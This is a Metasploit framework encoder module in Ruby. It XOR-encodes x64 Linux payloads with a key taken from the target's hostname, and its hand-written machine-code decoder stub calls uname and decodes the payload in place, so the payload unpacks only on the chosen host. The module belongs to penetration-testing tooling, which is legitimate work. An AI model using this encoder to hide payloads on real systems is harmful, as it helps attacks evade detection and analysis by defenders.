##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Encoder::Xor

  def initialize
    super(
      'Name'             => 'Hostname-based Context Keyed Payload Encoder',
      'Description'      => 'Context-Keyed Payload Encoder based on hostname and x64 XOR encoder.',
      'Author'           => [ 'sf' 'oso' ],
      'Arch'             => ARCH_X64,
      'License'          => MSF_LICENSE,
      'Platform'         => 'linux',
      'Decoder'          =>
        {
          'KeySize'      => 8,
          'KeyPack'      => 'Q',
          'BlockSize'    => 8,
        }
      )

    register_options([ OptString.new('C_HOSTNAME',[ true, "Context Hostname.", "hostname"])])
  end

  def obtain_key(buf, badchars, state)
    # TODO: Currently only first 8 chars are taken as key. We should include the other chars in the key.
    state.key = datastore['C_HOSTNAME'][0..8].reverse!.unpack('H*')[0].to_i(base=16)
  end

  def decoder_stub( state )
    # calculate the (negative) block count . We should check this against state.badchars.
    block_count = [-( ( (state.buf.length - 1) / state.decoder_key_size) + 1)].pack( "V" )

    decoder = ""+
      # get hostname
      "\x6a\x3f\x58" +                  # push 0x3f; pop rax
      "\x48\x8D\x3C\x24" +              # lea rdi, [rsp]
      "\x0F\x05" +                      # syscall ; LINUX - sys_uname
      "\x48\x8B\x5F\x41" +              # movq rbx, [rdi+0x41]; hostname

      # loop
      "\x48\x31\xC9" +                  # xor rcx, rcx
      "\x48\x81\xE9" + block_count +    # sub ecx, block_count
      "\x48\x8D\x05\xEF\xFF\xFF\xFF" +  # lea rax, [rip - 0x01]
      "\x48\x31\x58\x1d" +              # xor [rax+0x1d], rbx
      "\x48\x2D\xF8\xFF\xFF\xFF" +      # sub rax, -8
      "\xE2\xF4"                        # loop 0x1B
    return decoder
  end
end
